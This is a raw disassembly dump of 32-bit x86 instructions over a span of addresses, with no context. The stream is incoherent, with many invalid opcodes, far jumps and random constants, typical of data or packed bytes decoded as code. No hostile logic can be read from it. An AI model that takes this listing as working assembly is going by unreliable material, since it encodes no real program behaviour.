  410bfb:	mov    ds:0x75b26311,eax
  410c00:	div    BYTE PTR [eax-0x1f]
  410c03:	(bad)  
  410c04:	jmp    DWORD PTR [edi]
  410c06:	pusha  
  410c07:	scas   al,BYTE PTR es:[edi]
  410c08:	(bad)  
  410c09:	sbb    eax,0x2518679c
  410c0e:	inc    esi
  410c0f:	mov    ds,WORD PTR [esi]
  410c11:	cmp    BYTE PTR [eax+0x37],0x11
  410c15:	pop    esp
  410c16:	sbb    esp,DWORD PTR [ebp+0x223f532a]
  410c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c1d:	xlat   BYTE PTR ds:[ebx]
  410c1e:	add    al,0x51
  410c20:	pop    eax
  410c21:	mov    ebx,0xc858ad13
  410c26:	popa   
  410c27:	mov    esi,0x3aeb3294
  410c2c:	iret   
  410c2d:	lahf   
  410c2e:	jp     0x410bf5
  410c30:	scas   eax,DWORD PTR es:[edi]
  410c31:	das    
  410c32:	adc    edi,DWORD PTR [edi-0x598d2fc2]
  410c38:	push   es
  410c39:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c3b:	cli    
  410c3c:	mov    eax,ds:0x1c76dbc6
  410c41:	retf   
  410c42:	xlat   BYTE PTR ds:[ebx]
  410c43:	push   esp
  410c44:	retf   
  410c45:	jmp    0xd138f0ac
  410c4a:	test   eax,0xb1391a97
  410c4f:	pop    ss
  410c50:	das    
  410c51:	ret    0xe4d0
  410c54:	or     DWORD PTR [esp+eax*8-0x18],edx
  410c58:	shr    DWORD PTR [edx+0x3931e436],0x37
  410c5f:	pop    edx
  410c60:	aas    
  410c61:	retf   
  410c62:	mov    edx,0x220b7c92
  410c67:	dec    ecx
  410c68:	sub    ah,ah
  410c6a:	data16 (bad) 
  410c6c:	mov    ds:0xb9e2deaa,al
  410c71:	popf   
  410c72:	dec    edi
  410c73:	scas   eax,DWORD PTR es:[edi]
  410c74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c75:	popa   
  410c76:	mov    ?,esp
  410c78:	jbe    0x410ce6
  410c7a:	js     0x410c4b
  410c7c:	inc    edx
  410c7d:	ret    0xf7dc
  410c80:	test   eax,0xace45e0c
  410c85:	ja     0x410d00
  410c87:	outs   dx,DWORD PTR es:[esi]
  410c89:	ffree  st(6)
  410c8b:	jb     0x410cde
  410c8d:	ins    BYTE PTR es:[edi],dx
  410c8e:	pushw  0x2fb
  410c92:	push   ecx
  410c93:	iret   
  410c94:	(bad)  
  410c98:	loope  0x410c7d
  410c9a:	add    esp,DWORD PTR [ebx]
  410c9c:	mov    ds:0x4f4af522,al
  410ca1:	add    eax,0xe2198989
  410ca6:	dec    edi
  410ca7:	jle    0x410d04
  410ca9:	popa   
  410caa:	sti    
  410cab:	sub    eax,0x4ded8fa3
  410cb0:	div    DWORD PTR [ecx+0x6a]
  410cb3:	(bad)  
  410cb4:	(bad)
  410cb7:	pop    es
  410cb8:	dec    edx
  410cb9:	(bad)  
  410cba:	adc    cl,bh
  410cbc:	call   0x5bdb:0x9b989fc7
  410cc3:	retf   
  410cc4:	inc    esi
  410cc5:	ret    0xcafd
  410cc8:	clc    
  410cc9:	lods   eax,DWORD PTR ds:[esi]
  410cca:	mov    esi,0x15942139
  410ccf:	pop    ecx
  410cd0:	mov    bl,0xe2
  410cd2:	(bad)  
  410cd3:	mov    ecx,0x4141fdbe
  410cd8:	sbb    DWORD PTR [edi-0x2c516730],eax
  410cde:	pop    ebx
  410cdf:	out    dx,eax
  410ce0:	imul   BYTE PTR [edi]
  410ce2:	test   al,0x10
  410ce4:	inc    eax
  410ce5:	bound  ebp,QWORD PTR [edi+0x2f56f430]
  410ceb:	jle    0x410cb9
  410ced:	pop    esp
  410cee:	(bad)  
  410cef:	nop
  410cf0:	ror    BYTE PTR [esi],1
  410cf2:	sbb    esp,DWORD PTR [ebx-0x6e]
  410cf5:	xchg   ecx,eax
  410cf6:	mov    ds:0x7c5b2d35,al
  410cfb:	xor    bh,bh
  410cfd:	jg     0x410ce1
  410cff:	and    DWORD PTR [eax],ebx
  410d01:	pop    ss
  410d02:	mov    eax,0x1a8cfd47
  410d07:	aam    0x4f
  410d09:	xchg   ebp,eax
  410d0a:	jle    0x410d57
  410d0c:	(bad)  
  410d0d:	in     eax,dx
  410d0e:	and    BYTE PTR [ecx+0x454da06d],dl
  410d14:	or     ecx,DWORD PTR [ecx]
  410d16:	stos   DWORD PTR es:[edi],eax
  410d17:	lock mov WORD PTR [edx],es
  410d1a:	out    0xc2,eax
  410d1c:	jmp    0x410ca2
  410d1e:	js     0x410d01
  410d20:	jne    0x410cb6
  410d22:	push   es
  410d23:	xor    ebx,DWORD PTR [edi-0x1e]
  410d26:	or     eax,0x6c5cfac1
  410d2b:	mov    cl,0x48
  410d2d:	push   es
  410d2e:	inc    edx
  410d2f:	mov    edx,0x2a4bcb05
  410d34:	mov    dl,BYTE PTR [ecx+0x13]
  410d37:	retfw  0xdd9c
  410d3b:	or     dh,BYTE PTR [ecx+eax*8]
  410d3e:	pop    esi
  410d3f:	retf   
  410d40:	push   ecx
  410d41:	in     eax,0xb8
  410d43:	sub    dh,dl
  410d45:	or     ah,BYTE PTR [ebx+ebx*2+0x6d]
  410d49:	retw   0xdc04
  410d4d:	iret   
  410d4e:	js     0x410d97
  410d50:	xor    eax,0x186747df
  410d55:	or     al,0x6a
  410d57:	mov    edx,0xff995bbf
  410d5c:	fsub   st,st(6)
  410d5e:	(bad)  
  410d5f:	mov    esi,0x3ed857fc
  410d64:	fwait
  410d65:	retf   0xaebd
  410d68:	sub    DWORD PTR [ecx+0x20],edi
  410d6b:	push   es
  410d6c:	pop    ds
  410d6d:	call   ebp
  410d6f:	xchg   esi,eax
  410d70:	ror    BYTE PTR [edx-0x22f5ebd0],0xe7
  410d77:	sub    DWORD PTR [eax+0x1134cbc9],esp
  410d7d:	push   edx
  410d7e:	sub    esi,DWORD PTR [ebx+0x51]
  410d81:	out    0x8d,eax
  410d83:	sub    BYTE PTR [ecx],bl
  410d85:	hlt    
  410d86:	hlt    
  410d87:	push   ds
  410d88:	inc    edi
  410d89:	adc    ecx,DWORD PTR [ecx+0x70beba48]
  410d8f:	mov    ds:0x3120eb73,eax
  410d94:	sbb    eax,0x6779235a
  410d99:	cmp    esp,eax
  410d9b:	call   0xb285:0x6dc6a055
  410da2:	pop    esi
  410da3:	imul   edx,DWORD PTR [ebp+0x1e],0x817e49e5
  410daa:	pusha  
  410dab:	inc    edi
  410dac:	sbb    al,0x5f
  410dae:	cs push esi
  410db0:	push   es
  410db1:	ja     0x410e11
  410db3:	aad    0x3f
  410db5:	adc    DWORD PTR [esi],esp
  410db7:	add    al,0x86
  410db9:	push   eax
  410dba:	mov    ch,0xb6
  410dbc:	mov    ch,0xf5
  410dbe:	mov    eax,ds:0x81e3291f
  410dc3:	add    ebx,edi
  410dc5:	adc    al,0x5a
  410dc7:	and    BYTE PTR [ebp+0x61fe6e8f],ch
  410dcd:	mov    ebp,0x29ee0456
  410dd2:	icebp  
  410dd3:	mov    ah,0xe1
  410dd5:	bound  esp,QWORD PTR [edx+0x6cf24acc]
  410ddb:	mov    dl,0x84
  410ddd:	into   
  410dde:	ins    DWORD PTR es:[edi],dx
  410ddf:	push   ebx
  410de0:	sub    DWORD PTR [edx+0x3ed0897f],esp
  410de6:	push   ss
  410de7:	shl    DWORD PTR [ebx-0x283c74b0],cl
  410ded:	xchg   edx,eax
  410dee:	lds    ebp,FWORD PTR [edi-0x61]
  410df1:	jmp    0xf721:0x7d5d61a1
  410df8:	xor    esp,edi
  410dfa:	imul   edi,DWORD PTR [ecx],0xf006d9d6
  410e00:	jp     0x410deb
  410e02:	jnp    0x410dfc
  410e04:	das    
  410e05:	and    esi,eax
  410e07:	or     dl,BYTE PTR [ecx-0x4c]
  410e0a:	cmp    al,0xa0
  410e0c:	pop    edx
  410e0d:	xchg   esi,eax
  410e0e:	test   eax,0xbf4cfd43
  410e13:	xchg   edi,eax
  410e14:	nop
  410e15:	or     ebx,DWORD PTR [ebp+0x37]
  410e18:	aad    0x4
  410e1a:	retf   0x8d3
  410e1d:	or     al,0x9c
  410e1f:	or     al,0xfb
  410e21:	scas   al,BYTE PTR es:[edi]
  410e22:	mov    dl,0x84
  410e24:	jge    0x410e59
  410e26:	or     eax,0x592692ff
  410e2b:	ins    DWORD PTR es:[edi],dx
  410e2c:	dec    eax
  410e2d:	test   dh,0xb0
  410e30:	pop    eax
  410e31:	pop    es
  410e32:	cli    
  410e33:	out    dx,eax
  410e34:	cdq    
  410e35:	clc    
  410e36:	adc    al,0xd5
  410e38:	push   eax
  410e39:	push   ebp
  410e3a:	push   esp
  410e3b:	or     edx,DWORD PTR [ebp-0x2184eb48]
  410e41:	(bad)  
  410e42:	in     eax,dx
  410e43:	xlat   BYTE PTR ds:[ebx]
  410e44:	loope  0x410e98
  410e46:	scas   al,BYTE PTR es:[edi]
  410e47:	gs push es
  410e49:	xor    BYTE PTR [ecx+0x532fcac5],bh
  410e4f:	aam    0x27
  410e51:	out    0xee,eax
  410e53:	jae    0x410e43
  410e55:	lods   al,BYTE PTR ds:[esi]
  410e56:	cwde   
  410e57:	imul   ecx,DWORD PTR [edx+0x1dabc314],0x6f6033d0
  410e61:	dec    ebp
  410e62:	cli    
  410e63:	out    0xfc,eax
  410e65:	pop    esp
  410e66:	jne    0x410e0e
  410e68:	call   0x8d7f:0xba142972
  410e6f:	xchg   edx,eax
  410e70:	cmp    eax,0x9947c3b
  410e75:	out    0x30,al
  410e77:	jb     0x410e50
  410e79:	cmp    al,0x4b
  410e7b:	add    ebx,DWORD PTR [eax-0x72]
  410e7e:	loopne 0x410eb6
  410e80:	xchg   edx,eax
  410e81:	scas   eax,DWORD PTR es:[edi]
  410e82:	mov    edi,0x89ebb91
  410e87:	push   edx
  410e88:	pop    eax
  410e89:	or     eax,0x49fa3259
  410e8e:	jo     0x410e8f
  410e90:	and    BYTE PTR [esi],ah
  410e92:	mov    bh,0x63
  410e94:	arpl   bp,ax
  410e96:	sti    
  410e97:	sub    al,0x69
  410e99:	ror    ebx,cl
  410e9b:	jno    0x410e2f
  410e9d:	out    0xa4,eax
  410e9f:	int3   
  410ea0:	pop    ebx
  410ea1:	fwait
  410ea2:	mov    dh,0xee
  410ea4:	and    bh,al
  410ea6:	mov    WORD PTR [edi],ss
  410ea8:	int    0x1b
  410eaa:	xor    ecx,ecx
  410eac:	gs leave 
  410eae:	retf   0x7410
  410eb1:	push   edx
  410eb2:	xor    BYTE PTR [edx],ah
  410eb4:	dec    ecx
  410eb5:	scas   eax,DWORD PTR es:[edi]
  410eb6:	lea    esp,[ebx]
  410eb8:	sub    bh,dh
  410eba:	adc    dh,cl
  410ebc:	dec    edi
  410ebd:	lds    edi,FWORD PTR [ebx-0x4f]
  410ec0:	sbb    al,0x4b
  410ec2:	push   eax
  410ec3:	mov    esi,0xed9e7528
  410ec8:	adc    DWORD PTR [edx],ecx
  410eca:	stos   DWORD PTR es:[edi],eax
  410ecb:	inc    edx
  410ecc:	rcr    BYTE PTR [esi+0x4],1
  410ecf:	ror    DWORD PTR [ebp-0x1eac7cc8],0x6a
  410ed6:	aam    0xd4
  410ed8:	mov    ebp,0x1da9674e
  410edd:	std    
  410ede:	mov    ebx,0x9800cbc7
  410ee3:	std    
  410ee4:	mov    BYTE PTR [ebp+0x28],bl
  410ee7:	sub    eax,0xe64239a3
  410eec:	retf   
  410eed:	jne    0x410e82
  410eef:	test   DWORD PTR [esi+0xc],ecx
  410ef2:	jb     0x410f4c
  410ef4:	xor    ebx,DWORD PTR ds:0x1ad25d6b
  410efa:	jne    0x410f79
  410efc:	mov    eax,0xdac6d255
  410f01:	jno    0x410e8e
  410f03:	fwait
  410f04:	retf   
  410f05:	pop    ss
  410f06:	jge    0x410f79
  410f08:	inc    esi
  410f09:	(bad)  
  410f0a:	hlt    
  410f0b:	jae    0x410ef1
  410f0d:	xchg   ebp,eax
  410f0e:	daa    
  410f0f:	imul   eax,DWORD PTR [esi-0x5a727d0b],0x92b1b387
  410f19:	cmp    DWORD PTR [esi+0x68],0xffffffa4
  410f1d:	dec    esp
  410f1e:	mov    al,ds:0x181c766a
  410f23:	inc    ebx
  410f24:	mov    al,0x85
  410f26:	cld    
  410f27:	push   ds
  410f28:	mov    bh,0xf1
  410f2a:	pop    esi
  410f2b:	inc    ebx
  410f2c:	or     DWORD PTR [ebp+0x7d],0x8
  410f30:	loop   0x410f65
  410f32:	sahf   
  410f33:	clc    
  410f34:	and    al,0x2e
  410f36:	inc    ebx
  410f37:	sar    BYTE PTR [ebx],cl
  410f39:	cmp    BYTE PTR [ebx],0xec
  410f3c:	fst    DWORD PTR [ebx]
  410f3e:	aad    0xb8
  410f40:	xchg   DWORD PTR [ebx],esi
  410f42:	jmp    0x410f6e
  410f44:	daa    
  410f45:	sub    DWORD PTR [edx-0x69],eax
  410f48:	mov    al,0xa0
  410f4a:	jb     0x410f56
  410f4c:	pop    edi
  410f4d:	rcr    BYTE PTR [esi],cl
  410f4f:	outs   dx,BYTE PTR ds:[esi]
  410f50:	or     eax,0x3d286be7
  410f55:	jne    0x410f38
  410f57:	outs   dx,DWORD PTR ds:[esi]
  410f58:	in     eax,0x4c
  410f5a:	rcr    BYTE PTR [ebp+eax*4-0x56],0x5b
  410f5f:	push   eax
  410f60:	pop    DWORD PTR [ebx-0xd]
  410f63:	fldenv [ebp+0x1b1c1785]
  410f69:	lea    edi,[edx+edx*2-0x1b]
  410f6d:	dec    eax
  410f6e:	adc    cl,ah
  410f70:	jp     0x410ef9
  410f72:	(bad)  
  410f73:	leave  
  410f74:	push   edx
  410f75:	lods   al,BYTE PTR ds:[esi]
  410f76:	hlt    
  410f77:	rcl    BYTE PTR [edx-0x30],0x4
  410f7b:	or     DWORD PTR [edi+esi*8+0x78e6bab0],0x32
  410f83:	test   al,0x9e
  410f85:	sbb    esi,DWORD PTR [ebx+ebp*1+0x7f]
  410f89:	mov    edi,ss
  410f8b:	mov    dl,0xc6
  410f8d:	mov    ebx,0x42f9c1c
  410f92:	(bad)  
  410f93:	aad    0x2
  410f95:	ja     0x410fea
  410f97:	inc    edx
  410f98:	retf   0xbf0c
  410f9b:	sbb    DWORD PTR [eax+0x352600ef],ebx
  410fa1:	adc    BYTE PTR [ebp-0x35fae06c],bh
  410fa7:	call   0x8e3e:0x27e5b3a9
  410fae:	xor    esi,DWORD PTR [edi]
  410fb0:	add    BYTE PTR [ebp-0x54],ah
  410fb3:	jo     0x410ffa
  410fb5:	inc    eax
  410fb6:	jmp    0x41101a
  410fb8:	popa   
  410fb9:	das    
  410fba:	mov    edx,DWORD PTR [ecx+0x6cc3688e]
  410fc0:	jg     0x410f8d
  410fc2:	mov    edx,DWORD PTR [edi+0x17]
  410fc5:	inc    ebp
  410fc6:	lods   eax,DWORD PTR ds:[esi]
  410fc7:	bound  edx,QWORD PTR [ebp-0x3b]
  410fca:	ss xchg edx,eax
  410fcc:	enter  0xb57b,0x8c
  410fd0:	xchg   ebp,eax
  410fd1:	int    0xc4
  410fd3:	or     eax,0x3e91b3a8
  410fd8:	inc    edx
  410fd9:	loopne 0x410fa6
  410fdb:	retf   
  410fdc:	sbb    eax,0xd84d77ac
  410fe1:	xchg   ebx,eax
  410fe2:	inc    edx
  410fe3:	adc    al,0x5c
  410fe5:	in     eax,0x87
  410fe7:	pop    ds
  410fe8:	lods   al,BYTE PTR ds:[esi]
  410fe9:	pop    es
  410fea:	shl    edx,1
  410fec:	cmp    BYTE PTR [esi+0x2d19e9c1],ch
  410ff2:	iret   
  410ff3:	arpl   WORD PTR [ecx-0x74bdc2d7],bp
  410ff9:	bnd jg 0x411062
  410ffc:	gs out 0x9c,eax
  410fff:	retf   
  411000:	popf   
  411001:	jmp    DWORD PTR [ebx]
  411003:	addr16 out dx,al
  411005:	js     0x41102b
  411007:	mov    ebx,0xb3beede5
  41100c:	(bad)  
  41100d:	cmp    eax,0x8f22850b
  411012:	pop    esi
  411013:	fnstsw WORD PTR [eax-0x27]
  411016:	xor    BYTE PTR [esi],dh
  411018:	adc    al,0xc2
  41101a:	cmc    
  41101b:	jno    0x410ff3
  41101d:	pop    ebx
  41101e:	mov    bh,0x2a
  411020:	es pop eax
  411022:	lods   al,BYTE PTR ds:[esi]
  411023:	add    DWORD PTR [edx+eiz*4-0x3],edi
  411027:	inc    eax
  411028:	adc    al,0x79
  41102a:	xor    ah,ah
  41102c:	stc    
  41102d:	jmp    0x1363704e
  411032:	mov    ah,0xe2
  411034:	bound  esi,QWORD PTR [eax+0x7f]
  411037:	sti    
  411038:	push   cs
  411039:	retf   
  41103a:	xor    DWORD PTR [ebp+0x119b34ec],edx
  411040:	ins    BYTE PTR es:[edi],dx
  411041:	aas    
  411042:	stc    
  411043:	sbb    dh,bl
  411045:	pop    eax
  411046:	dec    edi
  411047:	es mov esi,0x489ae32b
  41104d:	mov    ch,0x69
  41104f:	jnp    0x41105b
  411051:	jg     0x411078
  411053:	in     eax,dx
  411054:	push   eax
  411055:	aas    
  411056:	cmc    
  411057:	das    
  411058:	test   al,0x57
  41105a:	or     eax,0x75425387
  41105f:	adc    ecx,DWORD PTR [ecx-0x33]
  411062:	mov    BYTE PTR [edi],al
  411064:	fs sub al,0xcb
  411067:	sub    al,0x66
  411069:	cmp    esi,DWORD PTR [ebx]
  41106b:	or     eax,0xca7876bf
  411070:	js     0x4110a7
  411072:	test   DWORD PTR [esi],edi
  411074:	ins    BYTE PTR es:[edi],dx
  411075:	xchg   edx,eax
  411076:	test   al,0xd7
  411078:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411079:	fidiv  DWORD PTR [edx-0x6fcbe9ba]
  41107f:	jo     0x4110b7
  411081:	(bad)  
  411082:	fild   WORD PTR [edi+0x11]
  411085:	pop    edx
  411086:	mov    edx,0x9ffd883d
  41108b:	pop    eax
  41108c:	mov    edi,0x19d216b3
  411091:	sti    
  411092:	repnz xchg esp,eax
  411094:	xchg   BYTE PTR [edi],dl
  411096:	xor    DWORD PTR [ecx+0x5b42602f],0x3f0d12df
  4110a0:	inc    eax
  4110a1:	cmp    eax,0x228be72
  4110a6:	push   0x822cecb6
  4110ab:	sbb    ebp,esp
  4110ad:	shl    ecx,0xc8
  4110b0:	sahf   
  4110b1:	mov    DWORD PTR [ebp+0x59ffb474],ebp
  4110b7:	sbb    DWORD PTR [eax+ebx*2+0x170add54],ecx
  4110be:	add    eax,0xece11a32
  4110c3:	sbb    ebp,DWORD PTR [edx-0x6f76ff12]
  4110c9:	pop    esi
  4110ca:	into   
  4110cb:	dec    BYTE PTR [eax+eax*8-0x28]
  4110cf:	mul    DWORD PTR [edi+0x29]
  4110d2:	adc    DWORD PTR [ebx],esi
  4110d4:	clc    
  4110d5:	jb     0x41112e
  4110d7:	mov    dh,0xbb
  4110d9:	sar    ah,1
  4110db:	scas   al,BYTE PTR es:[edi]
  4110dc:	xchg   BYTE PTR [edi-0x1b],dl
  4110df:	mov    eax,ds:0x8e7d0562
  4110e4:	add    eax,0x9b0d1712
  4110e9:	sahf   
  4110ea:	xchg   edx,eax
  4110eb:	aas    
  4110ec:	inc    esp
  4110ed:	cmp    eax,DWORD PTR [edi+edx*8-0x6e]
  4110f1:	fcom   st(0)
  4110f3:	mov    ds:0xb310c70b,al
  4110f8:	clc    
  4110f9:	ror    ch,0x1
  4110fc:	popf   
  4110fd:	push   edi
  4110fe:	ins    DWORD PTR es:[edi],dx
  4110ff:	repz sub DWORD PTR [ebp+0x5dfe891e],ebx
  411106:	outs   dx,DWORD PTR ds:[esi]
  411107:	add    esp,DWORD PTR [edx+ebx*8-0x5401b414]
  41110e:	inc    ecx
  41110f:	mov    ds,WORD PTR [esi-0x75]
  411112:	jb     0x4110ca
  411114:	and    ah,ah
  411116:	adc    DWORD PTR [edx+ebp*1],esp
  411119:	sub    ebp,0xffffffb1
  41111c:	shl    DWORD PTR [edx+0x39632b30],1
  411122:	xor    esp,edx
  411124:	jbe    0x41115b
  411126:	daa    
  411127:	adc    dl,BYTE PTR [edx+eiz*8+0x55]
  41112b:	and    edx,DWORD PTR [ebx]
  41112d:	mov    cl,0xdb
  41112f:	dec    esi
  411130:	mov    edi,0xdad90e7c
  411135:	retf   0x9574
  411138:	sub    al,0x12
  41113a:	repnz mov gs,WORD PTR [eax-0x761f6d4e]
  411141:	(bad)  
  411142:	mov    al,ds:0x505e8809
  411147:	sti    
  411148:	push   cs
  411149:	outs   dx,DWORD PTR ds:[esi]
  41114a:	int3   
  41114b:	pop    eax
  41114c:	jb     0x411117
  41114e:	leave  
  41114f:	call   0x5ce1:0x88a64441
  411156:	lods   eax,DWORD PTR ds:[esi]
  411157:	push   ebp
  411158:	jmp    0x411115
  41115a:	fnstenv [edx+esi*1]
  41115d:	sbb    eax,DWORD PTR [ebx+0x15]
  411160:	pop    ss
  411161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411162:	cmp    al,BYTE PTR [ebx]
  411164:	ret    
  411165:	mov    ds:0x1c91508a,eax
  41116a:	or     eax,ebx
  41116c:	mov    al,ds:0x9759eca1
  411171:	dec    eax
  411172:	in     al,0xd4
  411174:	push   0x3a
  411176:	mov    al,0x2e
  411178:	inc    ebp
  411179:	out    dx,eax
  41117a:	and    al,0x6
  41117c:	dec    ecx
  41117d:	or     DWORD PTR [esi],ebx
  41117f:	je     0x4111e4
  411181:	mov    edi,0x44cbbcde
  411186:	sbb    edi,DWORD PTR [ebx-0x64]
  411189:	out    0xc5,al
  41118b:	sbb    DWORD PTR [esp+ebx*2],0xffffffcc
  41118f:	mov    ch,BYTE PTR [eax+0x63]
  411192:	sbb    esi,DWORD PTR [ebp+0x34]
  411195:	mov    ds,WORD PTR [ebp+0x4d]
  411198:	and    al,dh
  41119a:	inc    eax
  41119b:	(bad)  
  41119c:	repnz and al,0x8e
  41119f:	jne    0x4111fa
  4111a1:	(bad)  
  4111a3:	(bad)  
  4111a4:	mov    ebp,0x1870711c
  4111a9:	xchg   BYTE PTR [ecx-0x46],dl
  4111ac:	mov    ecx,0xcc3a7761
  4111b1:	add    bl,BYTE PTR [edx-0x1a]
  4111b4:	mov    ebx,0xf2e57e6a
  4111b9:	inc    esi
  4111ba:	dec    esp
  4111bb:	xchg   DWORD PTR [edx+0x3266e78c],ecx
  4111c1:	leave  
  4111c2:	xchg   ebx,eax
  4111c3:	jl     0x4111b4
  4111c5:	iret   
  4111c6:	inc    esp
  4111c7:	mov    DWORD PTR [ecx+0x328884f8],esp
  4111cd:	inc    edx
  4111ce:	(bad)  
  4111cf:	sar    DWORD PTR [ecx+edi*8+0x64],cl
  4111d3:	push   eax
  4111d4:	push   es
  4111d5:	rcr    DWORD PTR [ecx+0x64],0x9b
  4111d9:	mov    ah,0x7d
  4111db:	and    ah,BYTE PTR [eax-0x32]
  4111de:	jns    0x411253
  4111e0:	loopne 0x411246
  4111e2:	das    
  4111e3:	push   eax
  4111e4:	das    
  4111e5:	pop    ecx
  4111e6:	in     eax,0x1d
  4111e8:	xchg   BYTE PTR [ebx],ah
  4111ea:	jns    0x41123a
  4111ec:	repz adc al,0x1
  4111ef:	sbb    DWORD PTR [esi+0x55],esi
  4111f2:	pop    ecx
  4111f3:	add    esi,DWORD PTR [ebp-0x77]
  4111f6:	cs scas al,BYTE PTR es:[edi]
  4111f8:	pop    es
  4111f9:	mov    WORD PTR [ebp+0xed3b6b1],cs
  4111ff:	scas   al,BYTE PTR es:[edi]
  411200:	sbb    eax,0x71c931e4
  411205:	outs   dx,BYTE PTR ds:[esi]
  411206:	ins    BYTE PTR es:[edi],dx
  411207:	imul   edi,DWORD PTR [edi+0x42764ba4],0x58
  41120e:	jle    0x411228
  411210:	cmp    eax,0xab9e318b
  411215:	mov    esi,0x33191aa5
  41121a:	(bad)  
  41121b:	push   edi
  41121c:	into   
  41121d:	push   ss
  41121e:	jl     0x411269
  411220:	xchg   esp,eax
  411221:	in     al,dx
  411222:	fist   DWORD PTR [ecx-0x19]
  411225:	adc    ah,ah
  411227:	outs   dx,DWORD PTR ds:[esi]
  411228:	mov    ebp,ebp
  41122a:	push   eax
  41122b:	outs   dx,BYTE PTR ds:[esi]
  41122c:	xchg   edi,eax
  41122d:	xor    eax,0xa8d7a8d7
  411232:	or     al,0x32
  411234:	outs   dx,DWORD PTR ds:[esi]
  411235:	push   edx
  411236:	data16 je 0x411270
  411239:	and    bh,BYTE PTR [ebp+0x4dc95fde]
  41123f:	and    eax,0xbf667043
  411244:	das    
  411245:	inc    edx
  411246:	leave  
  411247:	mov    cl,0x5e
  411249:	adc    eax,0xa3015a2e
  41124e:	xchg   DWORD PTR [esi+ecx*1+0x764ec11e],ebx
  411255:	sbb    bh,ah
  411257:	sbb    DWORD PTR [eax+ebx*8],edi
  41125a:	mov    ebp,0xcb64725f
  41125f:	shr    ebx,1
  411261:	dec    esi
  411262:	adc    eax,eax
  411264:	inc    eax
  411265:	das    
  411266:	stos   DWORD PTR es:[edi],eax
  411267:	adc    eax,0xb127b2b1
  41126c:	xchg   edi,eax
  41126d:	mov    ecx,0x40f6bebf
  411272:	jo     0x411200
  411274:	out    dx,eax
  411275:	mov    ebp,0x121d1c13
  41127a:	mov    al,0x37
  41127c:	inc    ebp
  41127d:	retf   
  41127e:	ds mov dl,0x93
  411281:	pusha  
  411282:	pop    ss
  411283:	ins    DWORD PTR es:[edi],dx
  411284:	stos   DWORD PTR es:[edi],eax
  411285:	sbb    eax,0xf36d00f9
  41128a:	mov    al,ds:0xb6b356cb
  41128f:	std    
  411290:	xor    al,0xff
  411292:	mov    esp,0x8ed9455
  411297:	cmp    BYTE PTR [edx],dh
  411299:	jmp    0x9692:0x42a776c
  4112a0:	pop    ebp
  4112a1:	jo     0x411311
  4112a3:	adc    al,0x79
  4112a5:	fdiv   QWORD PTR [ebp-0x1]
  4112a8:	mov    esp,edx
  4112aa:	frstor [ebp-0x28e140da]
  4112b0:	adc    DWORD PTR [ebp-0x70],edx
  4112b3:	stc    
  4112b4:	mov    edx,0xcb7d6c2
  4112ba:	mov    esi,0xf3e68d28
  4112bf:	das    
  4112c0:	xchg   ebp,eax
  4112c1:	jmp    0x4112f6
  4112c3:	pcmpeqd mm0,QWORD PTR ds:[esi+0x519a9f4c]
  4112cb:	ja     0x41127f
  4112cd:	sbb    DWORD PTR ds:0x830be7dc,ecx
  4112d3:	in     eax,0xe0
  4112d5:	inc    ecx
  4112d6:	cmp    eax,0x11df4bda
  4112db:	mov    esp,DWORD PTR [edx]
  4112dd:	add    eax,0x6969fff8
  4112e2:	xchg   esp,eax
  4112e3:	ss shl cl,cl
  4112e6:	out    0xd3,al
  4112e8:	add    bh,BYTE PTR [esi+0x51251c1d]
  4112ee:	adc    bh,0x94
  4112f1:	aam    0xb1
  4112f3:	sbb    eax,ebx
  4112f5:	mov    edx,0xc926ce59
  4112fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112fb:	enter  0xbbb0,0x63
  4112ff:	test   al,0x32
  411301:	and    ecx,ebp
  411303:	gs jmp 0x3df:0xc48fb3b2
  41130b:	sub    BYTE PTR [edx-0x59],cl
  41130e:	jl     0x4112d9
  411310:	sbb    BYTE PTR [ecx+0xd],0x9b
  411314:	pop    es
  411315:	xchg   edx,eax
  411316:	daa    
  411317:	pop    edx
  411318:	leave  
  411319:	les    ebp,FWORD PTR [ebx]
  41131b:	push   ebp
  41131c:	int3   
  41131d:	pop    eax
  41131e:	mov    dh,0x84
  411320:	or     ah,BYTE PTR cs:[ecx+edi*2-0x6f88916c]
  411328:	xor    al,0x81
  41132a:	sbb    eax,0x13712c09
  41132f:	test   BYTE PTR [eax-0x1e3148fa],bl
  411335:	push   ecx
  411336:	xchg   BYTE PTR [esi+0x3f97df8a],ah
  41133c:	daa    
  41133d:	frstor [edi+eax*8-0x5f]
  411341:	es mov ecx,0x4dd69a8e
  411347:	pop    edi
  411348:	xchg   ebp,eax
  411349:	stos   BYTE PTR es:[edi],al
  41134a:	test   DWORD PTR [eax],eax
  41134c:	sub    DWORD PTR [edx-0x4],edx
  41134f:	icebp  
  411350:	bound  ecx,QWORD PTR [edx]
  411352:	iret   
  411353:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411354:	out    0xfd,eax
  411356:	pushf  
  411357:	pop    edi
  411358:	test   eax,0xd2edaf8c
  41135d:	adc    dl,dh
  41135f:	pop    ebp
  411360:	das    
  411361:	mov    al,ds:0x6078ce27
  411366:	adc    eax,0x75653b62
  41136b:	mov    dl,BYTE PTR [eax-0x4f]
  41136e:	(bad)  
  41136f:	ror    DWORD PTR [esp],1
  411372:	xchg   esp,eax
  411373:	pop    ss
  411374:	ja     0x41134b
  411376:	jno    0x411357
  411378:	call   0xbdd4cd3d
  41137d:	add    al,0xd8
  41137f:	pop    eax
  411380:	mov    edx,0x9ca1f96a
  411385:	test   DWORD PTR [edi-0x3a2bdb9e],0xfc38f743
  41138f:	mov    DWORD PTR [ebx+0xd1e73b6],edi
  411395:	cmc    
  411396:	in     eax,dx
  411397:	mov    dh,dl
  411399:	popf   
  41139a:	mov    eax,0x3040934f
  41139f:	jp     0x4113ca
  4113a1:	ficom  DWORD PTR [ebp-0x48d9bc7d]
  4113a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113a8:	rcl    BYTE PTR [edi],1
  4113aa:	xchg   ecx,edx
  4113ac:	or     al,0x9e
  4113ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113af:	sub    eax,0x7f8094a4
  4113b4:	cmp    esi,DWORD PTR [esi]
  4113b6:	lods   eax,DWORD PTR ds:[esi]
  4113b7:	sbb    DWORD PTR [edx+eiz*4],ebp
